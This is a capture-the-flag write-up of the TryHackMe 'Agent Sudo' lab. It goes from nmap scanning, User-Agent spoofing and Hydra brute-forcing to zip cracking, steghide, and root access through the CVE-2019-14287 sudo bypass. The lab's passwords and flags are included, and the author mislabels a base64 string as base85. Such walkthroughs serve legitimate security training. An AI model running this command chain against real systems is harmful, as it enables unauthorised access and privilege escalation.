@@ -1,0 +1,248 @@
+So here we are having another ctf from tryhackme which is agentsudo listed as easy one.
+
+
+Main IP :: 10.49.139.251
+
+Performing all port scan with nmap \
+
+Nmap scan report for ip-10-49-139-251.ap-south-1.compute.internal (10.49.139.251)
+Host is up (0.00014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+80/tcp open  http
+
+Performing service and version detection scan
+
+Nmap scan report for ip-10-49-139-251.ap-south-1.compute.internal (10.49.139.251)
+Host is up, received reset ttl 64 (0.00021s latency).
+Scanned at 2026-05-28 04:35:32 UTC for 10s
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 ef:1f:5d:04:d4:77:95:06:60:72:ec:f0:58:f2:cc:07 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC5hdrxDB30IcSGobuBxhwKJ8g+DJcUO5xzoaZP/vJBtWoSf4nWDqaqlJdEF0Vu7Sw7i0R3aHRKGc5mKmjRuhSEtuKKjKdZqzL3xNTI2cItmyKsMgZz+lbMnc3DouIHqlh748nQknD/28+RXREsNtQZtd0VmBZcY1TD0U4XJXPiwleilnsbwWA7pg26cAv9B7CcaqvMgldjSTdkT1QNgrx51g4IFxtMIFGeJDh2oJkfPcX6KDcYo6c9W1l+SCSivAQsJ1dXgA2bLFkG/wPaJaBgCzb8IOZOfxQjnIqBdUNFQPlwshX/nq26BMhNGKMENXJUpvUTshoJ/rFGgZ9Nj31r
+|   256 5e:02:d1:9a:c4:e7:43:06:62:c1:9e:25:84:8a:e7:ea (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHdSVnnzMMv6VBLmga/Wpb94C9M2nOXyu36FCwzHtLB4S4lGXa2LzB5jqnAQa0ihI6IDtQUimgvooZCLNl6ob68=
+|   256 2d:00:5c:b9:fd:a8:c8:d8:80:e3:92:4f:8b:4f:18:e2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOL3wRjJ5kmGs/hI4aXEwEndh81Pm/fvo8EvcpDHR5nt
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-title: Annoucement
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+moving with port 80 
+
+Dear agents,
+
+Use your own codename as user-agent to access the site.
+
+From,
+Agent R
+
+we get this hint to perform enumeration
+
+GET /agent_C_attention.php HTTP/1.1
+Host: 10.49.139.251
+Accept-Language: en-US,en;q=0.9
+Upgrade-Insecure-Requests: 1
+User-Agent: C
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Referer: http://10.49.139.251/
+
+HTTP/1.1 200 OK
+Date: Thu, 28 May 2026 04:40:21 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 177
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Attention chris, <br><br>
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
+
+From,<br>
+Agent R 
+
+
+
+so we get this
+
+also with user agent J
+
+HTTP/1.1 200 OK
+Date: Thu, 28 May 2026 04:40:48 GMT
+Server: Apache/2.4.29 (Ubuntu)
+Vary: Accept-Encoding
+Content-Length: 177
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+Attention chris, <br><br>
+
+Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>
+
+From,<br>
+Agent R 
+
+hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.49.139.251
+
+so with this we get chris:crystal
+
+ ls
+To_agentJ.txt  cute-alien.jpg  cutie.png
+root@ip-10-49-105-194:~/Downloads# cat To_agentJ.txt 
+Dear agent J,
+
+All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.
+
+From,
+Agent C
+root@ip-10-49-105-194:~/Downloads# 
+
+and we get this note and 2 images from the ftp server 
+
+ exiftool cutie.png 
+ExifTool Version Number         : 12.76
+File Name                       : cutie.png
+Directory                       : .
+File Size                       : 35 kB
+File Modification Date/Time     : 2019:10:29 12:33:51+00:00
+File Access Date/Time           : 2026:05:28 04:44:04+00:00
+File Inode Change Date/Time     : 2026:05:28 04:44:04+00:00
+File Permissions                : -rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 528
+Image Height                    : 528
+Bit Depth                       : 8
+Color Type                      : Palette
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Palette                         : (Binary data 762 bytes, use -b option to extract)
+Transparency                    : (Binary data 42 bytes, use -b option to extract)
+Warning                         : [minor] Trailer data after PNG IEND chunk
+Image Size                      : 528x528
+Megapixels                      : 0.279
+
+so as we can see this it has been modified 
+
+let's get all data via binwalk
+
+binwalk -e cutie.png --run-as=root
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 528 x 528, 8-bit colormap, non-interlaced
+869           0x365           Zlib compressed data, best compression
+34562         0x8702          Zip archive data, encrypted compressed size: 98, uncompressed size: 86, name: To_agentR.txt
+34820         0x8804          End of Zip archive, footer length: 22
+
+
+png.extracted# ls
+365  365.zlib  8702.zip
+root@ip-10-49-105-194:~/Downloads/_cutie.png.extracted# zip2john 8702.zip > zip.hash
+root@ip-10-49-105-194:~/Downloads/_cutie.png.extracted# john zip.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (ZIP, WinZip [PBKDF2-SHA1 2
+
+alien            (8702.zip/To_agentR.txt)     
+
+ ls
+365  365.zlib  8702.zip  To_agentR.txt  zip.hash
+root@ip-10-49-105-194:~/Downloads/_cutie.png.extracted# cat To_agentR.txt 
+Agent C,
+
+We need to send the picture to 'QXJlYTUx' as soon as possible!
+
+By,
+Agent R
+
+and we get this
+
+so with cyberchef we see that above is base85 changes to Area51
+
+steghide info cute-alien.jpg 
+"cute-alien.jpg":
+  format: jpeg
+  capacity: 1.8 KB
+Try to get information about embedded data ? (y/n) y
+Enter passphrase: 
+  embedded file "message.txt":
+    size: 181.0 Byte
+    encrypted: rijndael-128, cbc
+    compressed: yes
+root@ip-10-49-105-194:~/Downloads# ls
+
+
+ cat mksf.txt 
+Hi james,
+
+Glad you find this message. Your login password is hackerrules!
+
+Don't ask me why the password look cheesy, ask agent R who set this password for you.
+
+Your buddy,
+chris
+root@ip-10-49-105-194:~/Downloads# 
+
+and here we are
+
+cat user_flag.txt  
+b03d975e8c92a7c04146cfa7a5a313c7
+james@agent-sudo:~$ 
+
+PRIVILEGE ESCALATION TIME
+
+ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+
+    we find this
+
+As we can see there is an CVE for this available but before let's check the sudo version here
+
+ sudo -l
+[sudo] password for james: 
+Matching Defaults entries for james on agent-sudo:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User james may run the following commands on agent-sudo:
+    (ALL, !root) /bin/bash
+https://www.cve.org/CVERecord?id=CVE-2019-14287&ref=blog.qz.sg
+
+and this cve is available
+
+sudo -u \#$((0xffffffff))
+
+ sudo -u \#$((0xffffffff)) /bin/bash
+root@agent-sudo:~# cat /root/root.txt 
+To Mr.hacker,
+
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+
+By,
+DesKel a.k.a Agent R
+
+So here we have this
